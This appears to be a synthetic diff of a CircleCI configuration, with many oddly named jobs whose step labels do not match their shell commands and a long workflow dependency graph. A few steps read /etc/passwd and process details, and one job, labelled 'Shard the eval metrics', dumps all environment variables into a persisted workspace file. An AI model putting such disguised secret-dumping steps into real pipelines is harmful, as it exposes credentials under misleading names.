+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/southBond 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  NamedFakeArticleElement:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: RISKY aliquot
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo -n "it's done" | sha256sum | cut -c1-16; true ; } > /tmp/reducer/rev.9.1
+            echo "written hash=$(sha256sum /tmp/reducer/rev.9.1 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'rev.9.1'
+  rl-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/rev.9.1 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  proj-alfa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Execute snapshot with respect to the thread pool
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; ls --reverse -v --human-readable -c /var/cache | tr '\n' ' '; true ; } > /tmp/reducer/slice_raster
+            echo "written hash=$(sha256sum /tmp/reducer/slice_raster | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'slice_raster'
+  validate-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/slice_raster 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  normalFn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Mirror The Submit Button To Denver
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; if [ -f "$HOME/.bashrc" ]; then echo "true"; elif [ -e /tmp ]; then echo maybe; else echo false; fi; true ; } > /tmp/reducer/md5_e39f8ead
+            echo "written hash=$(sha256sum /tmp/reducer/md5_e39f8ead | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'md5_e39f8ead'
+  check-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/epoch_741 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  PARAM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Optimisation whilst we wait
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; ls -1 /etc/default|tr '[:lower:]' '[:upper:]'|sed 's/^/- /'|cut -c1-20; true ; } > /tmp/reducer/rev-5003
+            echo "written hash=$(sha256sum /tmp/reducer/rev-5003 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'rev-5003'
+  rl-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/epoch_741 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  clipsecondarypeek:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Check RPO
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; ls -1S /usr/bin/*grep* | xargs; true ; } > /tmp/reducer/run_462
+            echo "written hash=$(sha256sum /tmp/reducer/run_462 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'run_462'
+  sierra-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/run_462 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+  Sceneer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: The subscribers get emailed
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f|awk -F "/" '{ print $NF }'|sort|uniq -c|sort --reverse --numeric-sort; true ; } > /tmp/reducer/Eiz4WQKFiE9APii
+            echo "written hash=$(sha256sum /tmp/reducer/Eiz4WQKFiE9APii | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'Eiz4WQKFiE9APii'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Snapshot workspace
+          command: |
+            sed '/./!d' /tmp/reducer/Eiz4WQKFiE9APii 2>/dev/null | wc -l || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack build archive
+          command: tar --extract --bzip2 --file=monthly-binaries.tar.bz2
+      - run:
+          name: Hash artifacts
+          command: env | wc -l
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./boot-prod"
+
+  lam_hat:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Remind the probation reviews and file
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -name 'cmd*' -group root -exec wc -c '{}' \; 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/reducer/rev.9.1
+            echo "written hash=$(sha256sum /tmp/reducer/rev.9.1 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'rev.9.1'
+  commit_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Resume count totals
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; compgen -b | grep -v '^[a-m]' | sort | uniq -c; true ; } > /tmp/reducer/frozen.host.copper.layer
+            echo "written hash=$(sha256sum /tmp/reducer/frozen.host.copper.layer | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'frozen.host.copper.layer'
+  cinnamon_b_89864:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Shard the eval metrics
+          command: |
+            mkdir -p /tmp/reducer
+            set +o pipefail 2>/dev/null; env > /tmp/reducer/sample-77b; printenv >> /tmp/reducer/sample-77b; for i in $(seq 1 500); do echo "line-${i}" >> /tmp/reducer/sample-77b; done; true
+            echo "written hash=$(sha256sum /tmp/reducer/sample-77b | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'sample-77b'
+  paint_wrap_warn_row:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: LEGACY compaction
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for name in orange apple kiwi papaya pear ; do echo "item: $name"; done | tac; true ; } > /tmp/reducer/2016-05-26T05-03
+            echo "written hash=$(sha256sum /tmp/reducer/2016-05-26T05-03 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '2016-05-26T05-03'
+  IS_INVALID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Badge the offer letters week one
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for num in monday sunday thursday friday; do printf '%-8s %d\n' "$num" ${#num}; done | nl; true ; } > /tmp/reducer/southBond
+            echo "written hash=$(sha256sum /tmp/reducer/southBond | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'southBond'
+  b9-62-50-bd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Second look at the bootloader
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; printf '%s\n' eagle otter bear crow owl >"/tmp/client.log" && wc -l "/tmp/client.log"; true ; } > /tmp/reducer/181.152.0.152
+            echo "written hash=$(sha256sum /tmp/reducer/181.152.0.152 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '181.152.0.152'
+  box-648:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Id b6c7 select
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo "good job"; echo "sunny today"; true ; } > /tmp/reducer/130e8b40-8a78-ba91
+            echo "written hash=$(sha256sum /tmp/reducer/130e8b40-8a78-ba91 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '130e8b40-8a78-ba91'
+  scale_full_disable_pipe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: MED 9416 normalization
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; sort -u /etc/shells|awk -F "/" '{print $NF}'|nl|head -20; true ; } > /tmp/reducer/224610_2015
+            echo "written hash=$(sha256sum /tmp/reducer/224610_2015 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '224610_2015'
+  dumpCountForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: 60 package the artifact registry
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for elem in zebra eagle cat shark lion duck;do echo ${#elem}; done; true ; } > /tmp/reducer/polarmuongarden
+            echo "written hash=$(sha256sum /tmp/reducer/polarmuongarden | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'polarmuongarden'
+  s_nWaveText:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: ask about the certificates
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; STEP=(cat swan eagle); (IFS=,; echo "${STEP[*]}"); true ; } > /tmp/reducer/doc.api
+            echo "written hash=$(sha256sum /tmp/reducer/doc.api | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'doc.api'
+  FD-PTR-TM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: We analyze the sessions table by hand
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for n in perth madrid quito helsinki oslo toronto; do printf '%s\n' $n; done | wc -l; true ; } > /tmp/reducer/run_462
+            echo "written hash=$(sha256sum /tmp/reducer/run_462 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'run_462'
+  jigsaw-tiger:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: CHECK TCP
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; head -n 2 /etc/passwd | cut -d":" -f1,3 | tr -s ' ' | fold -w 29; true ; } > /tmp/reducer/HInC3G2Z
+            echo "written hash=$(sha256sum /tmp/reducer/HInC3G2Z | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'HInC3G2Z'
+  ok:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: With logging render the pricing page
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; paste -d: <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd) | head; true ; } > /tmp/reducer/882e738e5868b81b3e8ae997c01b8260066bf4
+            echo "written hash=$(sha256sum /tmp/reducer/882e738e5868b81b3e8ae997c01b8260066bf4 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '882e738e5868b81b3e8ae997c01b8260066bf4'
+  CachedBuilderComponent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Did the CDN cache get mirrored
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; pgrep -a bash | head -n 3; true ; } > /tmp/reducer/trace-a9a6.log
+            echo "written hash=$(sha256sum /tmp/reducer/trace-a9a6.log | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'trace-a9a6.log'
+  cold-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Downbeat follow up
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; function trim() { local s=0; for n; do s=$((s + n)); done; echo $s; }; trim 30 17 8 28 42; true ; } > /tmp/reducer/debug-33fa66.log
+            echo "written hash=$(sha256sum /tmp/reducer/debug-33fa66.log | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'debug-33fa66.log'
+  model-dialog-semaphore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: nvm dump the dead tuples
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; locale -a | tail -n 3 | nl -w2 -s". "; true ; } > /tmp/reducer/0pers0
+            echo "written hash=$(sha256sum /tmp/reducer/0pers0 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - '0pers0'
+  z_scale:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Quantize the nightly dumps
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for val in magenta gray pink orange black; do echo ${val^^}; done | sort -r; true ; } > /tmp/reducer/pr0ton.f0r357.r3nd3r.a5537.c4ch3
+            echo "written hash=$(sha256sum /tmp/reducer/pr0ton.f0r357.r3nd3r.a5537.c4ch3 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'pr0ton.f0r357.r3nd3r.a5537.c4ch3'
+  corp-test-99:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: T minus 5 archival
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo "backup complete" | tac | expand -t 5; true ; } > /tmp/reducer/Eiz4WQKFiE9APii
+            echo "written hash=$(sha256sum /tmp/reducer/Eiz4WQKFiE9APii | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'Eiz4WQKFiE9APii'
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Sprinkle some linking on the tutorial series
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo -n 'retrying in 5 seconds' | fold -w 5; true ; } > /tmp/reducer/TXN18923
+            echo "written hash=$(sha256sum /tmp/reducer/TXN18923 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'TXN18923'
+  StandardTagPipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: T plus 2 archival
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; for u in {4..1}; do sleep 0.1; echo $u; done|tac; true ; } > /tmp/reducer/Hf3
+            echo "written hash=$(sha256sum /tmp/reducer/Hf3 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'Hf3'
+  tiv5jsrw3c0s9gj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: Sweep up the raw captures to save space
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; echo $PATH | tr : '\n' | rev | tr a-z A-Z; true ; } > /tmp/reducer/REF5781
+            echo "written hash=$(sha256sum /tmp/reducer/REF5781 | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'REF5781'
+  normalize_fork:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/reducer
+      - run:
+          name: like
+          command: |
+            mkdir -p /tmp/reducer
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >'/tmp/TREE_CONFIG_2021-07-16.gz' && gzip -t '/tmp/TREE_CONFIG_2021-07-16.gz' && echo valid; true ; } > /tmp/reducer/slice_raster
+            echo "written hash=$(sha256sum /tmp/reducer/slice_raster | cut -c1-10)"
+      - persist_to_workspace:
+          root: /tmp/reducer
+          paths:
+            - 'slice_raster'
+workflows:
+  all:
+    jobs:
+      - NamedFakeArticleElement
+      - lam_hat:
+          requires:
+            - NamedFakeArticleElement
+      - rl-alt:
+          requires:
+            - lam_hat
+      - monitor077:
+          requires:
+            - lam_hat
+      - commit_loop:
+          requires:
+            - monitor077
+      - py310-build:
+          requires:
+            - commit_loop
+      - price-set:
+          requires:
+            - commit_loop
+      - cinnamon_b_89864:
+          requires:
+            - price-set
+      - fix-retry-hang:
+          requires:
+            - cinnamon_b_89864
+      - UntypedCanvasOptions:
+          requires:
+            - cinnamon_b_89864
+      - paint_wrap_warn_row:
+          requires:
+            - UntypedCanvasOptions
+      - v8-canary5:
+          requires:
+            - paint_wrap_warn_row
+      - Qqqq:
+          requires:
+            - paint_wrap_warn_row
+      - IS_INVALID:
+          requires:
+            - Qqqq
+      - update-db-leak:
+          requires:
+            - IS_INVALID
+      - httpsTrimTotal:
+          requires:
+            - IS_INVALID
+      - b9-62-50-bd:
+          requires:
+            - httpsTrimTotal
+      - vb-old:
+          requires:
+            - b9-62-50-bd
+      - entry5:
+          requires:
+            - b9-62-50-bd
+      - box-648:
+          requires:
+            - entry5
+      - Verify_Prod9:
+          requires:
+            - box-648
+      - vompspuellkeesi
+      - scale_full_disable_pipe:
+          requires:
+            - vompspuellkeesi
+      - green-light:
+          requires:
+            - scale_full_disable_pipe
+      - TextureKind:
+          requires:
+            - scale_full_disable_pipe
+      - dumpCountForKey:
+          requires:
+            - TextureKind
+      - europa-beta:
+          requires:
+            - dumpCountForKey
+      - bugfix_close_lock:
+          requires:
+            - dumpCountForKey
+      - s_nWaveText:
+          requires:
+            - bugfix_close_lock
+      - py311-fmt:
+          requires:
+            - s_nWaveText
+      - clipsecondarypeek:
+          requires:
+            - s_nWaveText
+      - FD-PTR-TM:
+          requires:
+            - clipsecondarypeek
+      - sierra-1:
+          requires:
+            - FD-PTR-TM
+      - bus-546:
+          requires:
+            - FD-PTR-TM
+      - jigsaw-tiger:
+          requires:
+            - bus-546
+      - STG_DEPLOY_6:
+          requires:
+            - jigsaw-tiger
+      - ckpt724:
+          requires:
+            - jigsaw-tiger
+      - ok:
+          requires:
+            - ckpt724
+      - fix-router-v2-crash:
+          requires:
+            - ok
+      - article_spawn_next:
+          requires:
+            - ok
+      - CachedBuilderComponent:
+          requires:
+            - article_spawn_next
+      - rust-build:
+          requires:
+            - CachedBuilderComponent
+      - omni-table:
+          requires:
+            - CachedBuilderComponent
+      - cold-p:
+          requires:
+            - omni-table
+      - bug-9709:
+          requires:
+            - cold-p
+      - store-armv7-latest
+      - cerberus-alpha:
+          requires:
+            - store-armv7-latest
+      - clanSize7:
+          requires:
+            - store-armv7-latest
+      - node20-fmt:
+          requires:
+            - clanSize7
+      - ian2003:
+          requires:
+            - clanSize7
+      - APP-249:
+          requires:
+            - ian2003
+      - Stage-Model:
+          requires:
+            - ian2003
+      - validte:
+          requires:
+            - Stage-Model
+      - xref_POINT
+      - model-dialog-semaphore:
+          requires:
+            - xref_POINT
+      - golf:
+          requires:
+            - model-dialog-semaphore
+      - TempFunc:
+          requires:
+            - model-dialog-semaphore
+      - z_scale:
+          requires:
+            - TempFunc
+      - py310-release:
+          requires:
+            - z_scale
+      - Sceneer:
+          requires:
+            - z_scale
+      - corp-test-99:
+          requires:
+            - Sceneer
+      - rocket:
+          requires:
+            - corp-test-99
+      - flipwish:
+          requires:
+            - corp-test-99
+      - panWorkerRequest:
+          requires:
+            - flipwish
+      - test:
+          requires:
+            - panWorkerRequest
+      - BUCKET_NBF:
+          requires:
+            - panWorkerRequest
+      - StandardTagPipeline:
+          requires:
+            - BUCKET_NBF
+      - nebula-rc:
+          requires:
+            - StandardTagPipeline
+      - lst_sec
+      - tiv5jsrw3c0s9gj:
+          requires:
+            - lst_sec
+      - dotnet8-build:
+          requires:
+            - tiv5jsrw3c0s9gj
+      - proj-alfa:
+          requires:
+            - tiv5jsrw3c0s9gj
+      - normalize_fork:
+          requires:
+            - proj-alfa
+      - validate-staging-release-candidate:
+          requires:
+            - normalize_fork
+      - l10n_lv
+      - PARAM
+      - v3-edge:
+          requires:
+            - l10n_lv
+            - PARAM
+      - rl-2a:
+          requires:
+            - l10n_lv
+            - PARAM
+      - check-full-regression-suite:
+          requires:
+            - l10n_lv
+            - PARAM
+      - rm-edge:
+          requires:
+            - l10n_lv
+            - PARAM
